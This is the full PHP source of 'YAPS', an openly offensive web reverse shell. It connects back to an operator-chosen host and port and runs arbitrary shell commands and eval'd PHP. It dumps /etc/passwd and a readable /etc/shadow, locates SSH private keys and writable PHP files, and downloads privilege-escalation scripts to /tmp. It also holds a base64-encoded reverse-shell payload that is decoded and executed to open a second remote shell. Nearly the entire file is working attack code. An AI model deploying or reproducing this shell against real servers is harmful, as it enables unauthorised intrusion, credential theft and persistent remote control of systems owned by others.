<?php
# YAPS - Yet Another PHP Shell
# Version 1.0
# Made by Nicholas Ferreira
# https://github.com/Nickguitar/YAPS


//error_reporting(0);
set_time_limit(0);
ignore_user_abort(1);
ini_set('max_execution_time', 0);
ini_set('default_socket_timeout', pow(99, 6)); //negative timeout value should set it to infinite, but it doesn't. =(

########################## CONFIGS ############################

$resources = [
"linpeas"   => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
"linenum"   => "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
"suggester" => "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"];

$ip = '127.0.0.1';
$port = 7359;
$color = true; // colored prompt (prettier :)
$use_password = false; // only allows remote using the shell w/ password
// sha512("vErY_Go0d_$aLt".sha512("password123"))
$salt = 'v_3_r_Y___G_o_0_d___s_4_L_t';
$pass_hash = "38f7bbf8ccd3fdf407e7922c9376e14adcd6c3e30f428817a60562b68a433728e02fda482e0b10fe02bf83e43c890b603ba5ed8d439c087511515dbec04a1536"; // default: pass123

######################### END CONFIGS #########################

$yaps = $_SERVER['SCRIPT_FILENAME'];

// sets reverse socket via $_REQUEST['x'] and y (stealthier if used w/ POST (no IP logged))
if(isset($_REQUEST['x']) && isset($_REQUEST['y'])){ 
	$ip = $_REQUEST['x'];
	$port = $_REQUEST['y'];
}

$commands = [
//	"backdoor",
	"color",
//	"download",
	"enum",
	"help",
	"info",
	"passwd",
	"php",
	"stabilize",
	"suggester",
//	"upload"
];


function green($str){
	return "\e[92m".$str."\e[0m";
}
function red($str){
	return "\e[91m".$str."\e[0m";
}
function yellow($str){
	return "\e[93m".$str."\e[0m";
}
function cyan($str){
	return "\e[96m".$str."\e[0m";
}
function white($str){
	return "\e[97m".$str."\e[0m";
}

function banner(){
return cyan('

       o   o   O    o--o   o-o
        \ /   / \   |   ) (
         O   o---o  O--o   o-o
         |   |   |  |         )
         o   o   o  o     o--o
        Yet Another  PHP  Shell').white('
              Version 1.0
       Coder:  Nicholas Ferreira').'

   This is '.red('NOT').' an interactive shell.
       Use '.green('!help').' to see commands.';
}

function isAvailable($function){
	$dis = ini_get('disable_functions');
	if(!empty($dis)){
		$dis = preg_replace('/[, ]+/', ',', $dis);
		$dis = explode(',', $dis); // split by comma
		$dis = array_map('trim', $dis); //remove whitespace at the beginning and end
	}else{
		$dis = [];
	}
	
	if(is_callable($function) and !in_array($function, $dis))
		return true;
	return false;
}

function help(){

	$help = '
'.green('Useful commands:').'

  '.cyan('!help').'
  	Display this menu
  '.cyan('!color').'
  	Toggle $PS1 color (locally only)
  '.cyan('!enum').'
  	Download Linpeas and Linenum to /tmp and get it ready to run
  '.cyan('!info').'
  	List information about target
  './*cyan('!download <target file>').'
  	Downloads file from target to your PC
  '.cyan('!upload <source> <destination>').'
  	Uploads a source file from your PC to target destination folder
  '.*/cyan('!passwd').'
  	Show options for password	
  '.cyan('!php').'
  	Write and run PHP code on the remote host
  '.cyan('!stabilize').'
  	Stabilize to an interactive shell
  '.cyan('!suggester').'
  	Download Linux Exploit Suggester to /tmp and get it ready to run

';
	return $help;
}

function run_cmd($c){ // modified from msf

	$c = $c." 2>&1\n"; // stderr to stdout

	if(isAvailable('exec')){
		$stdout = array();
		exec($c, $stdout);
		$stdout = join(chr(10),$stdout).chr(10);
	}else if(isAvailable('shell_exec')){
		$stdout = shell_exec($c);
	}else if(isAvailable('popen')){
		$fp = popen($c, 'r');
		$stdout = NULL;
		if(is_resource($fp))
			while (!feof($fp))
				$stdout .= fread($fp, 1024);
		@pclose($fp);
	}else if(isAvailable('passthru')){
		ob_start();
		passthru($c);
		$stdout = ob_get_contents();
		ob_end_clean();
	}else if(isAvailable('proc_open')){
		$handle = proc_open($c, array(
			array('pipe','r') ,
			array('pipe','w') ,
			array('pipe','w')
		) , $pipes);
		$stdout = NULL;
		while (!feof($pipes[1]))
			$stdout .= fread($pipes[1], 1024);
		@proc_close($handle);
	}else if(isAvailable('system')){
		ob_start();
		system($c);
		$stdout = ob_get_contents();
		ob_end_clean();
	}else{
		$stdout = 0;
	}
	return $stdout;
}

$ps1 = str_replace(PHP_EOL,"",green(run_cmd("whoami")."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$

function sysinfo(){
	global $s;
	fwrite($s,green("\n====================== Initial info ======================\n\n"));
	$info  = cyan("[i] OS info:\n").run_cmd("lsb_release -a | grep -v 'No LSB'").PHP_EOL;

	$info .= cyan("[i] Hostname: ").run_cmd("hostname");
	$info .= cyan("[i] Kernel: ").run_cmd("uname -a");
	$info .= cyan("[i] CPU: ").run_cmd("lscpu | grep -i 'model name' | cut -d':' -f 2 | sed 's/^ *//g'");
	$info .= cyan("[i] RAM: ").run_cmd("free -h | grep Mem | cut -d':' -f 2 | sed 's/^ *//' | cut -d' ' -f 1");
	$info .= cyan("[i] Sudo version: ").run_cmd("sudo --version | grep 'Sudo version' | cut -d' ' -f 3");
	$info .= cyan("[i] User/groups: ").run_cmd("id").PHP_EOL;
	fwrite($s, $info);

	fwrite($s,green("====================== Users info ======================\n\n"));
	$info  = cyan("[i] Current user: ").run_cmd("whoami");
	$info .= cyan("[i] Users in /home: \n").run_cmd("ls /home").PHP_EOL;
	$info .= cyan("[i] Crontab of current user: \n").run_cmd("crontab -l | egrep -v '^#'").PHP_EOL;
	$info .= cyan("[i] Crontab: \n").run_cmd("cat /etc/crontab | egrep -v '^#'").PHP_EOL;
	fwrite($s, $info);

	fwrite($s,green("====================== All users ======================\n\n"));
	fwrite($s, run_cmd("cat /etc/passwd").PHP_EOL);
	if(is_readable("/etc/shadow"))
		fwrite($s, red("[!] /etc/shadow is readable!\n").run_cmd("cat /etc/shadow").PHP_EOL);

	fwrite($s, green("====================== Net info ======================\n\n"));
	$info  = cyan("[i] IP Info: ").run_cmd("ifconfig").PHP_EOL;
	$info .= cyan("[i] Hosts: \n").run_cmd("cat /etc/hosts | grep -v '^#'").PHP_EOL; // /etc/hosts file
	$info .= cyan("[i] Interfaces/routes: \n").run_cmd("cat /etc/networks && route").PHP_EOL;
	$info .= cyan("[i] IP Tables rules: \n").run_cmd("(iptables --list-rules 2>/dev/null)").PHP_EOL;
	$info .= cyan("[i] Active ports: ").run_cmd("(netstat -punta) 2>/dev/null").PHP_EOL; //established, listening, 0.0.0.0, 127.0.0.1
	fwrite($s, $info);

	fwrite($s, green("====================== Interesting binaries ======================\n\n"));
	$interesting_binaries = ['nc','nc.traditional','ncat','nmap','perl','python','python2','python2.6','python2.7','python3','python3.6','python3.7','ruby','node','gcc','g++','docker','php'];
	foreach ($interesting_binaries as $binary) {
		$binary = shell_exec("which $binary 2>/dev/null");
		if($binary !== "" && base64_encode($binary.PHP_EOL) !== "Cg==") // if not empty or newline
			fwrite($s, run_cmd("ls -l $binary"));
	}

	fwrite($s, green("\n====================== SUID binaries ======================\n\n"));
	$suid_list = explode("\n",shell_exec("find / -type f -perm /4000 2>/dev/null"));
	foreach($suid_list as $suid)
		if($suid !== "")
			fwrite($s, run_cmd("ls -l $suid"));

	fwrite($s, green("\n====================== SSH files ======================\n\n"));
	$authorized_keys = explode("\n",shell_exec("find / -type f -name authorized_keys 2>/dev/null")); // search for authorized_keys file
	foreach($authorized_keys as $public_key)
		if(is_writable($public_key))
			fwrite($s, red("[Writable] ").$public_key.PHP_EOL);
		else
			fwrite($s, $public_key.PHP_EOL);
	$id_rsa = explode("\n",shell_exec("find / -type f -name id_rsa 2>/dev/null")); // search for id_rsa files
	foreach($id_rsa as $priv_key)
		if(is_readable($priv_key))
			fwrite($s, red("[Readable] ").$priv_key.PHP_EOL);
		else
			fwrite($s, $priv_key.PHP_EOL);

	fwrite($s, green("\n=================== Writable PHP files ===================\n\n"));
	$webfiles_arr = [];
	$webdir = ['/var/www','/srv','/usr/local/apache2','/var/apache2','/var/www/nginx-default'];
	foreach($webdir as $dir)
		$webfiles_arr = array_merge($webfiles_arr, explode("\n", shell_exec("find ".$dir." -type f -name '*.php*' -writable 2>/dev/null")));


	if(count($webfiles_arr) > 25){
		for($i=0;$i<25;$i++)
			if($webfiles_arr[$i] !== "")
				fwrite($s, red("[Writable] ").$webfiles_arr[$i].PHP_EOL);
		fwrite($s, "...\n...".PHP_EOL);
		fwrite($s, green("[+] "). "Showing only the first 25 files. There are more!".PHP_EOL);
	}else{
		foreach($webfiles_arr as $file)
			if($file !== "")
				fwrite($s, red("[Writable] ").$file.PHP_EOL);
	}
	fwrite($s, cyan("\n[i]")." Get more information with !enum.".PHP_EOL);
}

function random_name($name = ""){
    $charset = 	implode("",array_merge(range("A", "Z"), range("a","z"), range(0,9))); // merge arrays and join them into a string
    for($i=0;$i<=mt_rand(5,6);$i++)
            $name .= $charset[mt_rand(0,strlen($charset)-1)];
    return $name;
}

function download($url){ //download file from $url to /tmp
	$randomName = random_name();
	if(isAvailable('file_get_contents')){
		if(isAvailable('file_put_contents')){
			if(file_put_contents("/tmp/".$randomName,file_get_contents($url))) return $randomName;
		}
		if(isAvailable('fopen') && isAvailable('fwrite') && isAvailable('fclose')){
			$fp = fopen("/tmp/".$randomName, "w");
			if(fwrite($fp, file_get_contents($url))){
				fclose($fp);
				return $randomName;
			}
		}
	}
	if(isAvailable('curl_setopt')){
		if(isAvailable('fopen') && isAvailable('fwrite') && isAvailable('fclose')){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL,$url);
			$fp = fopen('/tmp/'.$randomName, 'w+');
			curl_setopt($ch, CURLOPT_FILE, $fp);
			if(curl_exec($ch)){
				curl_close($ch);
				fclose($fp);
				return $randomName;
			}
		}
	}
	return false;
}

function enum(){ //download linpeas, save to /tmp and change its permission to 777
	global $s, $resources;
	$downloadLinpeas = $resources["linpeas"]; //name of downloaded file in /tmp
	$downloadLinenum = $resources["linenum"];
	if($downloadLinpeas){
		fwrite($s, green("[+]")." Linpeas saved to /tmp/".$downloadLinpeas.cyan("\n[i] Changing permissions...\n"));
		if(chmod("/tmp/".$downloadLinpeas, 777))
			fwrite($s, green("[+]")." Permissions changed! \n[i] You can run it with ".yellow("sh /tmp/".$downloadLinpeas." | tee /tmp/linpeas.log\n\n"));
		else
			fwrite($s, yellow("[!]")." Couldn't change permissions... \n[i] File was saved in ".yellow("/tmp/".$downloadLinpeas."\n\n"));
	}
	if($downloadLinenum){
		fwrite($s, green("[+] Linenum saved to /tmp/".$downloadLinenum).cyan("\n[i] Changing permissions...\n"));
		if(chmod("/tmp/".$downloadLinenum, 777))
			fwrite($s, green("[+]")." Permissions changed! \n[i] You can run it with ".yellow("sh /tmp/".$downloadLinenum." | tee /tmp/linenum.log\n"));
		else
			fwrite($s, yellow("[!]")." Couldn't change permissions... \n[i] File was saved in ".yellow("/tmp/".$downloadLinenum."\n"));
	}
}

function suggester(){//download linux exploit suggester, save to /tmp and change its permission to 777
	global $s, $resources;
	$download = download($resources["suggester"]);
	if($download){
		fwrite($s, green("[+]")." Linux Exploit Suggester saved to /tmp/".$download.cyan("\n[i]")." Changing permissions...\n");
		if(chmod("/tmp/".$download, 777))
			fwrite($s, green("[+]")." Permissions changed! \n[i] You can run it with ".yellow("sh /tmp/".$download." | tee /tmp/LES.log\n"));
		else
			fwrite($s, yellow("[!]")." Couldn't change permissions... \n[i] File was saved in ".yellow("/tmp/".$download."\n"));
	}
	return;
}

function refresh_ps1($changecolor=false){ //build a nice PS1, toggle between colored and not colored
	global $color,$ps1;
	$user = str_replace(PHP_EOL, "", run_cmd("whoami"));

	if(!$color){
		$ps1 = str_replace(PHP_EOL,"",green($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$
		if($user == "root") $ps1 = str_replace(PHP_EOL,"",red($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."# "); // root@hostname:~#
		if($changecolor) $color = true;
	}else{
		$ps1 = str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."$ "); // user@hostname:~$
		if($user == "root") $ps1 = str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."# "); // root@hostname:~#
		if($changecolor) $color = false;
	}
}

function getPHP(){ //receive PHP code via socket
	global $s;
	$php = '';
	fwrite($s, cyan("[*]")." Write your PHP code (*without* PHP tags). To send and run it, use ".green("!php").". ".yellow("\n[i] Note that this is NOT an interactive PHP shell. Max input: 4096 bytes.").white("\nphp> "));
	while($c = fread($s, 4096)){
		if(substr($c,0,-1) == "!php") // remove newline at end
			return $php;
		if(substr($c,0,-1) == "!cancel") // remove newline at end
			return 0;
		fwrite($s, white("php> ")); //prompt
		$php .= $c; // append received line to the whole php code to be executed
	}
	return $php;
}

function runPHP($code){ // guess what
	try{
		ob_start();
		eval($code); // do the magic
		$result = ob_get_contents(); //get buffer from eval() to return later
		ob_end_clean();
	}catch (Throwable $ex){
		$err = explode("Stack trace:", $ex)[0];
		$result = $err; //return the error
	}
	return $result;
}

function stabilize(){
	global $s, $port, $ip;
	$script = run_cmd("which script");
	$py3 = run_cmd("which python3");
	$py = run_cmd("which python");
	fwrite($s, yellow("[i]")." Set up a listener on another port (nc -lnvp port) and press ENTER.\nChoose a port: ");
	while($c = fread($s, 8)){ //reads [ENTER]
		if(strlen($c) > 0){ // got [ENTER]
			$recv_port = (int)$c; // get the integer part
			if($recv_port>65535 || $recv_port==0){
				fwrite($s,red("[-]")." Port must be between 0-65535.\nChoose another port: ");
			}else{
				$payload = "c2hlbGxfZXhlYygiZWNobyAnaWYocGNudGxfZm9yaygpKWV4aXQoMCk7J3xwaHAgLXInZXZhbChmaWxlKFwicGhwOi8vc3RkaW5cIilbMF0pOyciKTskc2NyaXB0PXNoZWxsX2V4ZWMoIndoaWNoIHNjcmlwdCIpOyRweTM9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uMyIpOyRweT1zaGVsbF9leGVjKCJ3aGljaCBweXRob24iKTtpZihzdHJsZW4oJHNjcmlwdCk+NiAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0iL2Jpbi9iYXNoIC1jaSAnIi4kc2NyaXB0LiIgLXFjIC9iaW4vYmFzaCAvZGV2L251bGwnIjtlbHNlIGlmKHN0cmxlbigkcHkzKT43ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweTMuIiAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIjtlbHNlIGlmKHN0cmxlbigkcHkpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9JHB5LiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSAkc3RhYmlsaXplcj0iL2Jpbi9iYXNoIjskc3RhYmlsaXplcj1zdHJfcmVwbGFjZSgiXG4iLCIiLCRzdGFiaWxpemVyKTskc2hlbGw9InVuYW1lIC1hOyRzdGFiaWxpemVyIjt1bWFzaygwKTskc29jaz1mc29ja29wZW4oIklQX0FERFIiLFBPUlQsJGVycm5vLCRlcnJzdHIsMzApOyRzdGQ9YXJyYXkoIDAgPT4gYXJyYXkoInBpcGUiLCJyIiksMSA9PiBhcnJheSgicGlwZSIsInciKSwyID0+IGFycmF5KCJwaXBlIiwidyIpICk7JHByb2Nlc3M9cHJvY19vcGVuKCRzaGVsbCwkc3RkLCRwaXBlcyk7Zm9yZWFjaCgkcGlwZXMgYXMgJHApIHN0cmVhbV9zZXRfYmxvY2tpbmcoJHAsMCk7c3RyZWFtX3NldF9ibG9ja2luZygkc29jaywwKTt3aGlsZSghZmVvZigkc29jaykpeyRyZWFkX2E9YXJyYXkoJHNvY2ssJHBpcGVzWzFdLCRwaXBlc1syXSk7aWYoaW5fYXJyYXkoJHNvY2ssJHJlYWRfYSkpIGZ3cml0ZSgkcGlwZXNbMF0sZnJlYWQoJHNvY2ssMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1sxXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1sxXSwyMDQ4KSk7aWYoaW5fYXJyYXkoJHBpcGVzWzJdLCRyZWFkX2EpKSBmd3JpdGUoJHNvY2ssZnJlYWQoJHBpcGVzWzJdLDIwNDgpKTt9IGZjbG9zZSgkc29jayk7Zm9yZWFjaCgkcGlwZXMgYXMgJHApIGZjbG9zZSgkcCk7cHJvY19jbG9zZSgkcHJvY2Vzcyk7"; // modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 

				$final_payload = base64_encode(str_replace("IP_ADDR", $ip, str_replace("PORT", $recv_port, base64_decode($payload)))); // changes payload to add correct socket
				fwrite($s, yellow("[i]")." Trying to connect to $ip:$recv_port\n".cyan("[*] ")."The present shell freezed.\nHit CTRL+C here and use the other or wait for the other to die.\n");
				run_cmd("echo ".$final_payload."| base64 -d | php -r 'eval(file(\"php://stdin\")[0]);'"); // does the magic
				return;
			}
		}
	}
}

function backdoor(){
// todo
}

function check_password(){
	global $s, $pass_hash, $salt;
	fwrite($s, yellow("[i] ")."This shell is protected. \nEnter the password: ");
	while($data = fread($s,1024)){
		$entered_pass = substr($data,0,-1); //remove newline at end
		return hash("sha512", $salt.hash("sha512",$entered_pass, false), false) == $pass_hash ? true : false;
	}
}

function change_password($new){
	global $salt, $yaps, $s;
	$new_hash = hash("sha512", $salt.hash("sha512",$new, false), false);
	if(!is_readable($yaps) || !is_writable($yaps)) return false; //someone changed the permission
	$yaps_code = file_get_contents($yaps);
	$new_yaps_code = preg_replace('/[a-f0-9]{128}/', $new_hash, $yaps_code, 1); // the password hash is be the first thing this regex should match
	if(file_put_contents($yaps, $new_yaps_code)){
		fwrite($s, green("[+] ")."Password changed. Changes will take effect on next connection.\n");
		return true;
	}else{
		fwrite($s, red("[-] ")."Couldn't read or write the file. Are the permissions right?\n" . run_cmd("ls -l ".$yaps."\n"));
		return false;
	}
}

function toggle_password(){
	global $use_password, $s, $yaps;
	$yaps_code = file_get_contents($yaps);
	if($use_password){ //password currently active
		$new_yaps_code = preg_replace('/(\$use_password += +)(true)/', '$1false', $yaps_code, 1);
		if(file_put_contents($yaps, $new_yaps_code)){
			$use_password = false;
			fwrite($s, green("[+] ")."Password deactivated.\n");
			return true;
		}
		fwrite($s, red("[-] ")."Couldn't deactivate password.\n");
		return false;
	}
	// will enter here if use_password is false
	$new_yaps_code = preg_replace('/(\$use_password += +)(false)/', '$1true', $yaps_code, 1); //limit must be 1
	if(file_put_contents($yaps, $new_yaps_code)){
		$use_password = false; // if limit isn't 1, this will be changed to false too
		fwrite($s, green("[+] ")."Password activated.\n");
		return true;
	}
	fwrite($s, red("[-] ")."Couldn't activate password.\n");
	return false;
}

function passwd(){
	global $s,$use_password;
	if($use_password){
		if(!check_password()){
			fwrite($s, red("[-] ")." Wrong password\n");
			return;
		} 
		fwrite($s, green("[+] Password is enabled. ").white("Choose an option:")."\n[1] Change password\n[2] Disable password\n[3] Cancel\n> ");
		while($data = fread($s, 8)){
			switch(substr($data, 0, -1)){
				case "1": // change password
					fwrite($s,cyan("[*] ")."Choose the new password: ");
					while($data2 = fread($s, 1024)){
						$newPass = substr($data2, 0, -1); //remove newline at end
						change_password($newPass);
						return;
					}
				break;

				case "2": // disable password
					toggle_password();
					return;
				break;

				default:
					fwrite($s, cyan("[*] ")."Canceled.\n");
					return;
				break;
			}
		}
	}else{ // no password required
		fwrite($s, yellow("[!] Password is disabled. ").white("Choose an option:")."\n[1] Set a password\n[2] Enable password\n[3] Cancel\n> ");
		while($data = fread($s, 8)){
			switch(substr($data, 0, -1)){
				case "1": // set a new password
				fwrite($s,cyan("[*] ")."Choose the new password: ");
				while($data2 = fread($s, 1024)){
					$newPass = substr($data2, 0, -1); //remove newline at end
					change_password($newPass);
					return;
				}
				break;

				case "2": // enable password
					toggle_password();
					return;
				break;
				
				default:
					fwrite($s, cyan("[*] ")."Canceled.\n");
					return;
				break;
			}
		}
	}
}

function parse_stdin($input){
	global $s;
	switch(substr($input,0,-1)){ // remove newline at end
		case "!info":
			return sysinfo();
			break;
		case "!enum":
			return enum();
			break;
		case "!suggester":
			return suggester();
			break;
		case "!color":
			refresh_ps1(true);
			break;
		case "!help":
			return help();
			break;
		case "!php":
			$phpCode = getPHP();
			if($phpCode !== 0){
				$result = runPHP($phpCode);
				fwrite($s, $result);
			}else{
				fwrite($s, yellow("[i] Code canceled.").PHP_EOL);
			}
			break;
		case "!stabilize":
			stabilize();
			break;
		case "!backdoor":
			backdoor();
			break;
		case "!passwd":
			passwd();
			break;
	}	
}

function cmd_not_found($cmd){
	global $s, $commands;
	foreach($commands as $valid_cmd){
		similar_text($cmd, $valid_cmd, $percentage);
		if($percentage > 70){ // if they're similar, suggest correction
			fwrite($s, yellow("[!] ")."Command '!$cmd' not found. Did you mean '!".$valid_cmd."'?.\n");
			return;
		}
	}
	fwrite($s, yellow("[!] ")."Command '!".substr($c,1,-1)."' not found. Use !help.\n");
	return;
}
refresh_ps1(1);
$nofuncs = red('[-] There are no exec functions');
if(isAvailable('fsockopen')){
	$s = @fsockopen("tcp://$ip", $port);
	if($s){
		if($use_password)
			if(!check_password()) die(fwrite($s,red("[-]")." Wrong password.\n")); // guess what
		if(!isset($_REQUEST['silent']) && !isset($_REQUEST["s"])) //if not in silent mode
			fwrite($s, banner()."\n"); //send banner through socket
		else
			fwrite($s, "[+] Connection received from YAPS. Press enter.\n");
		refresh_ps1();
		fwrite($s, "\n".$ps1);
		while($c = fread($s, 2048)){
			$out = '';
			if(substr($c,0,1) == "!"){//if starts with "!"
				if(in_array(strtolower(substr($c,1,-1)), $commands)) // if the command is valid
					$out = parse_stdin($c);
				else
					cmd_not_found(substr($c,1,-1)); // try to suggest correction
			}elseif(substr($c, 0, 3) == 'cd '){
				chdir(substr($c, 3, -1)); // since this isn't interactive, use chdir 
			}else{
				$out = run_cmd(substr($c, 0, -1));
			}
			if($out === false){
				fwrite($s, $nofuncs);
				break;
			}
			refresh_ps1();
			fwrite($s, $out.$ps1);
		}
		fclose($s);
	}else{
		die("[-] Couldn't connect to socket.");
	}
}
